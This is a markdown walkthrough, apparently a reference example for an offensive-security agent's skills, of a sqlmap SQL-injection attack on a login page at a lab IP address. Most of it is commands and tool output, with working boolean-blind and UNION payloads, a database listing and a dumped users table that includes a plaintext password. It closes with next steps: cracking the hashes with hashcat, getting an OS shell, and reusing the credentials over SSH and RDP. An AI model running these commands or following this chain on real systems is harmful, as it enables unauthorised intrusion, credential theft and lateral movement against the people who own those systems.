# SQLMap Injection Detection Example

## Command
```bash
$ sqlmap -u "http://10.10.10.75/login.php" --data "username=admin&password=test" \
  --batch --level 3 --risk 2
```

## Output
```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 15:45:12 /2025-01-15/

[15:45:12] [INFO] testing connection to the target URL
[15:45:12] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:45:12] [INFO] testing if the target URL content is stable
[15:45:13] [INFO] target URL content is stable
[15:45:13] [INFO] testing if POST parameter 'username' is dynamic
[15:45:13] [WARNING] POST parameter 'username' does not appear to be dynamic
[15:45:13] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[15:45:13] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[15:45:13] [INFO] testing for SQL injection on POST parameter 'username'
[15:45:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:45:14] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Invalid")
[15:45:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:45:15] [INFO] target URL appears to have 4 columns in query
[15:45:15] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4512=4512 AND 'YxMu'='YxMu&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=admin' UNION ALL SELECT NULL,CONCAT(0x7178627a71,0x4f6a4c7856...),NULL,NULL-- -&password=test
---
[15:45:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 (focal)
web application technology: Apache 2.4.41, PHP 7.4.3
back-end DBMS: MySQL >= 5.0 (MariaDB fork)

[15:45:15] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] megacorp_app
[*] mysql

[*] ending @ 15:45:16 /2025-01-15/
```

## Escalation — Dump Users Table
```bash
$ sqlmap -u "http://10.10.10.75/login.php" --data "username=admin&password=test" \
  --batch -D megacorp_app -T users --dump

Database: megacorp_app
Table: users
[5 entries]
+----+----------+------------------------------------------+-------+
| id | username | password                                 | role  |
+----+----------+------------------------------------------+-------+
| 1  | admin    | $2y$10$7K.8Qj2v.../bcrypt_hash_here       | admin |
| 2  | jsmith   | $2y$10$abc.../bcrypt_hash_here             | user  |
| 3  | mjones   | $2y$10$def.../bcrypt_hash_here             | user  |
| 4  | dbadmin  | password123!                             | admin |
| 5  | testuser | $2y$10$ghi.../bcrypt_hash_here             | user  |
+----+----------+------------------------------------------+-------+
```

## Key Findings
- **SQL Injection confirmed** — UNION-based (fast extraction) + boolean blind
- **MySQL/MariaDB** on Ubuntu 20.04 with PHP 7.4.3
- **Plaintext password** for dbadmin: `password123!` (CRITICAL)
- **Bcrypt hashes** for other users → credential_access for cracking

## Next Steps
→ **credential_access skill**: Crack bcrypt hashes with hashcat -m 3200
→ **exploitation skill**: Try `--os-shell` for command execution
→ **lateral_movement skill**: Test `dbadmin:password123!` on other services (SSH, RDP)
